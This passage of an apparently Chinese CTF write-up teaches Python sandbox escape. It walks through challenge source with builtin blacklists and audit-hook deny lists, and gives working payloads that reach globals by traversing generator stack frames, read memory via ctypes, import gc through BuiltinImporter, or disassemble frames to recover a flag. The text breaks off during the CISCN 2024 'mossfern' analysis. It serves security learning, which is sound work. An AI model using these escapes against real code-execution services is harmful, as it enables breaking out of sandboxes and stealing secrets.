+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这道题的提交按钮被disables了，删了就能提交了</p>
+<p>直接用栈帧逃逸打吧，这道题对于栈帧逃逸的关键字没得过滤，可以直接用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> a.gi_frame.f_back</span><br><span class="line">	</span><br><span class="line">a=haha()</span><br><span class="line">c=<span class="built_in">next</span>(a)</span><br><span class="line">d=c.f_back.f_globals[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605224858187.png" alt="image-20240605224858187"></p>
+<h6 id="ctypes模块"><a href="#ctypes模块" class="headerlink" title="ctypes模块"></a>ctypes模块</h6><p>但是这里的flag被删除了，不会了，看下<strong>晨曦师傅的做法</strong></p>
+<p>思路：题目环境在 chroot jail 中，没有 &#x2F;proc 目录，不能通过读文件的方式读内存，但是</p>
+<p><strong>可以利用<code>ctypes</code>模块的指针</strong>，将flag地址周围的值读一下，实现一个从内存读源码的操作。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">	txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">		<span class="built_in">print</span>(txt)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>学习一下wp：</p>
+<p>主要关注两个部分，如下：</p>
+<ul>
+<li><code>id()</code>函数：返回对象的内存地址，<a href="https://blog.csdn.net/zhuzuwei/article/details/80554776">参考文章</a></li>
+<li><code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code></li>
+</ul>
+<p>将第二个拆分解答</p>
+<ul>
+<li><p><code>ctypes.cast(address, type)</code> 函数将一个地址转换为指定类型的指针。在这里是将一个地址转换为指定类型的指针。</p>
+</li>
+<li><p><code>ctypes.c_char_p</code>是ctypes类的数据，表示 C 风格的 <code>char *</code> 指针，用于指向字符串。</p>
+</li>
+<li><p><code>flag_id-8*</code>，那随便输入两个变量套一个id()就可以看看两个变量的地址差值，尝试了一下，完全符合，晨曦师傅tql</p>
+</li>
+</ul>
+<p>结合起来，<code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code>，可以参考<a href="https://blog.csdn.net/jhsxy2005/article/details/114371993">文章</a></p>
+<p>这就是读取对应内存地址的值的构造方法，<strong>那么为什么是<code>flag_id-8*i</code>，个人想法</strong>（应该没有错吧）：</p>
+<p>当前<code>flag_id</code>对应<code>DISPOSED</code>，同时已知这个真实flag是先被赋值了的，说明真实flag的内存是在前面，所以这里是<code>-</code>，向前推进。</p>
+<p>然后最后匹配到就输出flag。精妙精妙，学到了学到了。</p>
+<h6 id="gc模块"><a href="#gc模块" class="headerlink" title="gc模块"></a><code>gc</code>模块</h6><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p>
+<p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器,<a href="https://blog.csdn.net/jeffery0207/article/details/120612313">参考文章</a></p>
+<p><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br></pre></td></tr></table></figure>
+
+
+
+<p>让gpt改了一下，本地利用的方式为：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _frozen_importlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入的模块名称</span></span><br><span class="line">module_name = <span class="string">&#x27;gc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用BuiltinImporter导入模块</span></span><br><span class="line">loaded_module = _frozen_importlib.BuiltinImporter.load_module(module_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块内容</span></span><br><span class="line"><span class="built_in">print</span>(loaded_module)</span><br><span class="line"><span class="built_in">print</span>(loaded_module.get_objects())</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="官方的做法"><a href="#官方的做法" class="headerlink" title="官方的做法"></a>官方的做法</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line">io = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;io&#x27;</span>)</span><br><span class="line">dis = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;dis&#x27;</span>)</span><br><span class="line">threading = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())     <span class="comment">#获取所有活跃线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread())    <span class="comment">#获取主线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread().ident)   <span class="comment"># 获取主线程标识符</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames())      <span class="comment"># 获取所有线程的堆栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="comment">#获取到主线程的堆栈帧对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">	dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">	content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">	out.close()</span><br><span class="line">	<span class="built_in">print</span>(content)</span><br><span class="line">	frame = frame.f_back</span><br></pre></td></tr></table></figure>
+
+<p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p>
+<p>需要对其栈帧进行反汇编拿到初次赋值的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out = io.StringIO()     # 内存创建字符串I/O流</span><br><span class="line">dis.dis(frame.f_code,file=out)   # 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br><span class="line">content = out.getvalue()    #获取反汇编的结果</span><br><span class="line">out.close()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p>分析可看参考文章</p>
+<p>文章：<code>https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</code></p>
+<p><code>https://c1oudfl0w0.github.io/blog/2024/04/24/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/#gc%E8%A7%A3%E6%B3%95</code></p>
+<h5 id="CISCN-2024-–mossfern"><a href="#CISCN-2024-–mossfern" class="headerlink" title="CISCN 2024 –mossfern"></a>CISCN 2024 –mossfern</h5><p>题目描述：<br>小明最近搭建了一个学习 Python 的网站，他上线了一个 Demo。据说提供了很火很安全的在线执行功能，你能帮他测测看吗？</p>
+<p>——————————————————</p>
+<p>在ctfshow上可以复现，但是没有前端，不想去复现，给了附件：</p>
+<p>main.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>runner.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
+
+<p>关键代码，在runner.py中，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">source_simple_check函数中：禁了<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span></span><br><span class="line">block_wrapper函数中，禁了<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span></span><br><span class="line">禁了gc模块</span><br><span class="line">source_opcode_checker函数要求opcode解释出来还不能有LOAD_GLOBAL、IMPORT_NAME、 LOAD_METHOD</span><br><span class="line"></span><br><span class="line">其他地方，这里将内建函数禁了，那么这里就用不了`<span class="built_in">next</span>()`函数</span><br><span class="line"><span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先看了一下其他师傅的wp，我最开始不是很懂为什么会得到flag的值，审计代码+测试代码搞懂了，首先注意下面这一个部分代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(</span><br><span class="line">            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))</span><br></pre></td></tr></table></figure>
+
+<p>这里应该是flag的值没有被改变，只是在写进去的时候被改变了，出题人就是在这里“不安好心”，先看测试代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/1234.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">        runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha))</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">open</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;/app/uploads/1234.py&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">5</span> ((<span class="string">&#x27;encoding&#x27;</span>,))</span><br><span class="line">             <span class="number">14</span> CALL_FUNCTION_KW         <span class="number">3</span></span><br><span class="line">             <span class="number">16</span> LOAD_METHOD              <span class="number">1</span> (write)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_GLOBAL              <span class="number">2</span> (runner)</span><br><span class="line">             <span class="number">20</span> LOAD_METHOD              <span class="number">3</span> (replace)</span><br><span class="line">             <span class="number">22</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;THIS_IS_SEED&#x27;</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_FAST                <span class="number">0</span> (flag)</span><br><span class="line">             <span class="number">26</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">28</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> POP_TOP</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">34</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到字节码中已经有了完整的<code>THIS_IS_SEED</code>，所以在我们输出时肯定有这个被输出，但是这个被禁了，如下代码：</p>
